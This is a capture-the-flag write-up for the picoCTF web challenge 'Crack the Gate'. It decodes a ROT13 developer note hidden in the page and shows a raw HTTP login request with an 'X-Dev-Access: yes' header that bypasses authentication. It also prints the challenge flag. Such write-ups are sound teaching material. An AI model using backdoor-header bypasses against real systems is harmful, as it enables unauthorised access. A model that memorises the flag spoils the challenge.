# Crack the Gate

### Description:

We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?
Additional details will be available after launching your challenge instance.
`Click "Launch Instance".`
The website is running `here`. Can you try to log in?

### Commands / Steps:

```bash
# Step 1: Go to the website.

# Step 2: Inspect the website with dev tools.

# Step 3: In the body tag, there's a note which looks suspicious.
ABGR: Wnpx-grzcbenel olcnff: hfr urnqre “K-Qri-Npprff: lrf”
# The first thing that came to my mind was "Ceaser Cipher". So let's try that first by using either an online encoder or manually.

# Step 4: We got this after 13 shifts in alphabets. "NOTE: Jack-temporary bypass: use header “X-Dev-Access: yes”"

# Step 5: Let's open burpsuite to edit the request header when logging in. 

# Step 6: I edited the request header like this before forwarding the login request.
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:56710
Content-Length: 51
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://amiable-citadel.picoctf.net:56710
Referer: http://amiable-citadel.picoctf.net:56710/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
X-Dev-Access: yes  *************

{"email":"ctf-player@picoctf.org","password":"abc"}
# Then we get the flag.
```

### Flag:

> picoCTF{brut4_f0rc4_b3a957eb}

### Notes / Tips

- `Caesar Cipher`: Shift cipher where you try different rotation values
- `Trial & Error`: Try shifts 1-25 until text becomes readable
- `ROT13`: Specific case of Caesar cipher with shift 13 (common in CTFs)
- `Custom Headers`: Bypass authentication with developer headers
- `Burp Suite`: Intercept and modify HTTP requests
- `Web Inspection`: Always check page source for hidden clues


